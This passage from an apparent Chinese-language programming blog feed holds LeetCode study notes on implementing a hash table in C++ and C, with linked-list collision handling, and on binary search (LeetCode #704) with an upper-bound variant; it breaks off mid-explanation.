class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用 C++　STL 再刷題時會方便更多:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;string, Person&gt; hash_table;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash_table</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_table</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_insert</span><span class="params">(<span class="type">const</span> Person&amp; p)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_delete</span><span class="params">(<span class="type">const</span> string&amp; name)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init_hash_table</span>();</span><br><span class="line"></span><br><span class="line">    Person Walt = &#123;.name = <span class="string">&quot;Walt&quot;</span>, .age = <span class="number">26</span>&#125;;</span><br><span class="line">    Person Skyler = &#123;.name = <span class="string">&quot;Skyler&quot;</span>, .age = <span class="number">27</span>&#125;;</span><br><span class="line">    Person Saul = &#123;.name = <span class="string">&quot;Saul&quot;</span>, .age = <span class="number">28</span>&#125;;</span><br><span class="line">    Person Mike = &#123;.name = <span class="string">&quot;Mike&quot;</span>, .age = <span class="number">29</span>&#125;;</span><br><span class="line">    Person Hank = &#123;.name = <span class="string">&quot;Hank&quot;</span>, .age = <span class="number">30</span>&#125;;</span><br><span class="line">    Person Mary = &#123;.name = <span class="string">&quot;Mary&quot;</span>, .age = <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add persons into hash_table</span></span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Walt);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Skyler);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Saul);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Mike);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Hank);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Mary);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_table</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delete person from hash table</span></span><br><span class="line">    <span class="built_in">hash_table_delete</span>(<span class="string">&quot;Walt&quot;</span>);</span><br><span class="line">    <span class="built_in">print_table</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash_table</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    hash_table.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_table</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;--------Start--------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; pair : hash_table) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; pair.first &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; pair.second.name &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;--------End----------&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_insert</span><span class="params">(<span class="type">const</span> Person&amp; p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> result = hash_table.<span class="built_in">insert</span>(&#123;p.name, p&#125;);</span><br><span class="line">    <span class="keyword">return</span> result.second; <span class="comment">// True if insertion took place, false if key already existed</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_delete</span><span class="params">(<span class="type">const</span> string&amp; name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hash_table.<span class="built_in">erase</span>(name) &gt; <span class="number">0</span>; <span class="comment">// True if element was removed, false if key didn&#x27;t exist</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="添加碰撞處理"><a href="#添加碰撞處理" class="headerlink" title="添加碰撞處理"></a>添加碰撞處理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TABLE_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">person</span> *<span class="title">next</span>;</span> <span class="comment">// pointer to the next person in the list</span></span><br><span class="line">&#125; person;</span><br><span class="line"></span><br><span class="line">person *hash_table[TABLE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>;</span><br><span class="line">person* <span class="title function_">hash_table_lookup</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    init_hash_table();</span><br><span class="line"></span><br><span class="line">    person Walt = &#123;.name = <span class="string">&quot;Walt&quot;</span>, .age = <span class="number">26</span>&#125;;</span><br><span class="line">    person Skyler = &#123;.name = <span class="string">&quot;Skyler&quot;</span>, .age = <span class="number">27</span>&#125;;</span><br><span class="line">    person Saul = &#123;.name = <span class="string">&quot;Saul&quot;</span>, .age = <span class="number">28</span>&#125;;</span><br><span class="line">    person Mike = &#123;.name = <span class="string">&quot;Mike&quot;</span>, .age = <span class="number">29</span>&#125;;</span><br><span class="line">    person Hank = &#123;.name = <span class="string">&quot;Hank&quot;</span>, .age = <span class="number">30</span>&#125;;</span><br><span class="line">    person Mary = &#123;.name = <span class="string">&quot;Mary&quot;</span>, .age = <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add persons into hash_table</span></span><br><span class="line">    hash_table_insert(&amp;Walt);</span><br><span class="line">    hash_table_insert(&amp;Skyler);</span><br><span class="line">    hash_table_insert(&amp;Saul);</span><br><span class="line">    hash_table_insert(&amp;Mike);</span><br><span class="line">    hash_table_insert(&amp;Hank);</span><br><span class="line">    hash_table_insert(&amp;Mary);</span><br><span class="line"></span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delete person from hash table</span></span><br><span class="line">    hash_table_delete(<span class="string">&quot;Walt&quot;</span>);</span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the hash function</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> length = strnlen(name, MAX_NAME);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash_value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        hash_value += name[i];</span><br><span class="line">        hash_value = (hash_value * name[i]) % TABLE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the hash table to NULL (let it be empty)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TABLE_SIZE; i++) &#123;</span><br><span class="line">        hash_table[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print out the hash table</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------Start--------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TABLE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash_table[i] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t---\n&quot;</span>, i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            person *tmp = hash_table[i];</span><br><span class="line">            <span class="keyword">while</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t%s\n&quot;</span>, i, tmp-&gt;name);</span><br><span class="line">                tmp = tmp-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------End----------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert the element into the hash_table</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = hash(p-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Insert at the head of the list</span></span><br><span class="line">    p-&gt;next = hash_table[index];</span><br><span class="line">    hash_table[index] = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lookup a person in the hash table by name</span></span><br><span class="line">person* <span class="title function_">hash_table_lookup</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = hash(name);</span><br><span class="line">    person *tmp = hash_table[index];</span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strncmp</span>(tmp-&gt;name, name, MAX_NAME) != <span class="number">0</span>) &#123;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete a person from the hash table by name</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = hash(name);</span><br><span class="line">    person *tmp = hash_table[index];</span><br><span class="line">    person *prev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strncmp</span>(tmp-&gt;name, name, MAX_NAME) != <span class="number">0</span>) &#123;</span><br><span class="line">        prev = tmp;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        hash_table[index] = tmp-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prev-&gt;next = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>當發生碰撞時，這裡使用 close addressing (即 linked list) 來解決問題。具體實現如下：</p><p>Linked List：</p><p>每個 person 結構中包含一個 next 指標，以形成 linked list。<br><strong>Hash Table 的每個槽 ( <code>hash_table[index]</code> ) 都是一個 linked list 的 Head Pointer。</strong></p><ul><li>插入操作：</li></ul><p><code>hash_table_insert</code> 函數在計算出索引後，將新的 person 插入到對應索引的 linked list 的頭部。</p><ul><li>查找操作：</li></ul><p><code>hash_table_lookup</code> 函數 traverse 指定索引的 linked list，查找特定名稱的 person。</p><ul><li>刪除操作：</li></ul><p><code>hash_table_delete</code> 函數在指定索引的 linked list 中查找並刪除特定的 person，並維持 linked list 的結構。<br>這樣的實現方法使用了 linked list 來解決 Hash Table 中的哈希碰撞問題，保證在發生碰撞時依然能正確地插入、查找和刪除資料。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6">https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6</a><br>[2] <a href="https://hackmd.io/@coherent17/Sk4fomSkt#%E9%9B%9C%E6%B9%8A%E8%A1%A8Hash-table">https://hackmd.io/@coherent17/Sk4fomSkt#%E9%9B%9C%E6%B9%8A%E8%A1%A8Hash-table</a><br>[3] <a href="https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/">https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/</a><br>[4] <a href="https://haogroot.com/2022/06/19/how-to-design-hash-table/">https://haogroot.com/2022/06/19/how-to-design-hash-table/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> hash table </tag>
            
            <tag> complexity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元搜尋法 | Easy | LeetCode#704 Binary Search</title>
      <link href="/posts/22bf447e.html"/>
      <url>/posts/22bf447e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/BS_Question.jpeg"></p><p>題目中有一個整數陣列 nums, 這個陣列是以排序的陣列，並且在這當中想要找到 target 這個元素的 index, 如果沒找到就回傳 -1。並且要求所實現的演算法其實時間複雜度為 $O(Log n)$</p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的作法"><a href="#我的作法" class="headerlink" title="我的作法"></a>我的作法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init</span></span><br><span class="line">    <span class="type">int</span> i,mid=<span class="number">0</span>,low=<span class="number">0</span>, high=numsSize<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Binary search</span></span><br><span class="line">    <span class="comment">// 1. find lower index and high index according to the length of array</span></span><br><span class="line">    <span class="comment">// 2  calculate middle value</span></span><br><span class="line">    <span class="comment">// 3. update low and high value</span></span><br><span class="line">    <span class="comment">// 4. again calcuate the new middle value until derive the target value or return -1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">    <span class="comment">// needs to consider the situation that the middle number is not an even number</span></span><br><span class="line">    mid = (<span class="type">int</span>)((low + high)/<span class="number">2.0</span>); </span><br><span class="line">    <span class="comment">// need to find the lower section of array</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(nums[mid] &gt; target)&#123; </span><br><span class="line">            high = mid<span class="number">-1</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">        low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// find value</span></span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這邊使用了 Binary Search 的標準做法，<strong>首先設定進行切分的中間值 mid，透過 low 以及 high 去取平均來找中間值。</strong> 接著我們開始判斷狀況:</p><ul><li>當 <code>nums[mid] &gt; target:</code> 這就代表中間值大於要找的target 值，<strong>也就是說可以把 mid 的右側部分捨棄，僅找左側部分</strong>，因此需要調整 high 的值，來縮小查找範圍<ul><li><code>high = mid -1;</code></li></ul></li><li>當 <code>nums[mid] &lt; target:</code> 這就代表中間值小於要找的target 值，<strong>也就是說可以把 mid 的左側部分捨棄，僅找右側部分</strong>，因此需要調整 low 的值，來縮小查找範圍</li><li><code>low = mid +1;</code></li><li>第三種狀況就是找到 <code>target</code> 值就在陣列中，即回傳 mid 值</li><li>while 迴圈的中止條件會是 <code>low &gt; high</code>，這就代表已經找太多遍，確定陣列中沒有target值了，直接結束迴圈並且 <code>return -1</code></li></ul><blockquote><p>注意，在中間值時候建議改寫成 <code>mid =  low + (high -  low)/2</code> 這樣做可以避免 high 跟 low 都是較大的數字，相加導致溢位的問題</p></blockquote><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p><img src="/img/LeetCode/BS_Result.png"></p><h2 id="其他做法-求上界"><a href="#其他做法-求上界" class="headerlink" title="其他做法 -  求上界"></a>其他做法 -  求上界</h2><p><img src="/img/LeetCode/BS_upper.png"></p><p>這是在 LeetCode 解答區看到的其他做法，與其直接找到 Target 本身，<strong>不如去找能夠 Target 在這個陣列中能夠插入的點</strong></p><p>這個解法中首先定義了能被插入的區塊，如同圖片中描述的一樣，如一個陣列假設是 <code>[-7,-4,3,9,9,9,12]</code> 那他最大能夠插入的位置會是在 <code>9</code> 與 <code>12</code>之間，而他最小能夠插入的位置會是 <code>3</code> 和 <code>9</code> 之間。</p><p>首先 一樣需要計算中間值的位置，接著做判斷時分別考慮:</p><ul><li>當 <code>nums[mid] &lt; target:</code> 這就代表中間值小於要找的target 值，這時代表可能插入的位置在 mid 的右側，因此調整 low 的範圍，繼續找上界</li><li><code>low = mid +1;</code></li><li>當 <code>nums[mid] == target:</code> 這就代表中間值等於要找的target 值，時代表可能插入的位置在 mid 的右側，因此調整 low 的範圍，繼續找上界</li><li><code>low = mid +1;</code></li><li>當 <code>nums[mid] &gt; target:</code> 這就代表中間值大於要找的target 值，時代表可能插入的位置在 mid 的左側，因此調整 high 的範圍，繼續找上界，這時 mid 也可能是可插入的位置，因此 high 設為 mid<ul><li><code>high = mid;</code></li></ul></li></ul><p>一旦迴圈結束， <strong><code>high</code> 代表的意義是插入的位置， <code>low -1</code> 代表的是不大於 <code>target</code> 的最大元素</strong> 所以結束後會去需要檢查 <code>nums[low-1]</code> 是否等於 <code>target</code>，有就回傳 low-1 沒有就回傳 -1</p><p>演算法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// array init</span></span><br><span class="line">    <span class="type">int</span> i,mid=<span class="number">0</span>,low=<span class="number">0</span>, high=numsSize<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Approach-2 Find Upper Bound</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line"></span><br><span class="line">        mid = low + (<span class="type">int</span>)((high-low)/<span class="number">2.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt;= target)&#123;</span><br><span class="line">            low = mid +<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( low &gt; <span class="number">0</span> &amp;&amp; target == nums[low<span class="number">-1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> low <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( nums[low] == target &amp;&amp; low ==<span class="number">0</span> )&#123; <span class="comment">// edge case</span></span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( high == numsSize<span class="number">-1</span> &amp;&amp; target == nums[high])&#123; <span class="comment">//edge case</span></span><br><span class="line">        <span class="keyword">return</span> high;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="為什麼這種方法能找到目標值"><a href="#為什麼這種方法能找到目標值" class="headerlink" title="為什麼這種方法能找到目標值?"></a>為什麼這種方法能找到目標值?</h3><ul><li><strong>合併條件</strong>：在這種方法中，我們將 nums[mid] &lt; target 和 nums[mid] &#x3D;&#x3D; target 這兩個條件合併了，因為不管是小於還是等於，目標值的插入位置都應該在 mid 的右側。所以這時候都將 left 設為 mid + 1。</li><li><strong>保持有效範圍</strong>：如果 nums[mid] &gt; target，說明目標值應該在 mid 及其左側，所以我們將 right 設為 mid，而不是 mid - 1，這樣我們保留了 mid 作為一個可能的位置。</li><li><strong>循環結束判斷</strong>：當 left 和 right 相等時，循環結束，left 即為目標值的插入位置。如果目標值在陣列中存在，那麼 left - 